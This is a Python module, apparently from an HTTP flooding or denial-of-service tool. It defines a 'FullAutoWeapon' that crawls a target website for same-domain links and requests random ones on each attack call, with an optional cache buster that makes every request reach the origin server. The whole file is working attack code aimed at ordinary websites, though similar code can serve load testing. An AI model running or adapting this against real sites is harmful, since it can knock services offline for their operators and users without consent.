
import random
import urllib
import app.net
from . import Weapon, WeaponFactory
from bs4 import BeautifulSoup


class FullAutoFactory(WeaponFactory):

    def make(self):

        return FullAutoWeapon(
            http_method=self._http_method,
            cache_buster=self._cache_buster
        )


class FullAutoWeapon(Weapon):

    def __init__(self, **kwargs):
        Weapon.__init__(self, **kwargs)

        self._urls = []

    def target(self, target_url):

        # add the target URl as the first URL in our running list

        target_url = app.net.url_ensure_valid(target_url)

        self._add_url(
            parent_url=target_url,
            new_url=target_url
        )

    def _add_url(self, **kwargs):
        """
        Add a new URL to our internal list for attack
        :param parent_url: The URL which the new_url was scraped from
        :param new_url: The new URL to add to our list. Relative URLs will be automatically resolved based on the
        parent_url
        """

        parent_url = kwargs['parent_url'] if 'parent_url' in kwargs else ''
        new_url = kwargs['new_url'] if 'new_url' in kwargs else ''

        # parse the parent_url and get the domain, which we will use to resolve relative URLs

        parent_scheme, parent_netloc, parent_path, parent_params, parent_query, parent_fragment = urllib.parse.urlparse(parent_url)

        if not parent_netloc:
            parent_netloc, parent_path = parent_path, ''

        # parse the new_url

        new_scheme, new_netloc, new_path, new_params, new_query, new_fragment = urllib.parse.urlparse(new_url)

        # resolve relative links

        if not new_netloc:

            # make relative to parent URL
            new_netloc = parent_netloc

            # handle non-root relative URLs
            if not new_path.startswith('/'):
                new_path = "%s/%s" % (
                    parent_path.strip('/'),
                    new_path
                )

        # set scheme if not present in link

        if not new_scheme:

            if parent_scheme:
                new_scheme = parent_scheme
            else:
                new_scheme = 'https'

        # reconstruct/unparse the new_url

        new_url = urllib.parse.urlunparse(
            (new_scheme, new_netloc, new_path, '', '', '')
        )

        # add the new URL to our list

        if new_netloc == parent_netloc:  # only URLs on the target domain

            if new_scheme.lower() in ['http', 'https']:  # only URLs via HTTP/HTTPS

                if new_url not in self._urls:  # no duplicates
                    self._urls.append(new_url)

    def _hit(self, target_url):

        target_url = app.net.url_ensure_valid(target_url)

        if self._cache_buster:
            target_url = app.net.url_cache_buster(target_url)

        # hit the URL and get HTML content for parsing

        response = app.net.request(self._http_method, target_url)
        status_code = response.getcode()
        html_code = response.read()
        http_info = response.info()

        if http_info.get_content_type() == 'text/html':

            # parse html doc and pull out all the links
            soup = BeautifulSoup(html_code, "html.parser")
            for link in soup.findAll('a'):
                url = link.get('href')

                self._add_url(
                    parent_url=target_url,
                    new_url=url
                )

        else:
            # if not a HTML page, remove it from our list so we don't hit it again

            self._urls.remove(target_url)

        return status_code

    def attack(self):

        # select a random target URL from our list and hit it
        this_target_url = self._urls[random.randint(0, len(self._urls)-1)]
        status_code = self._hit(this_target_url)

        return (1, status_code)  # 1 hit
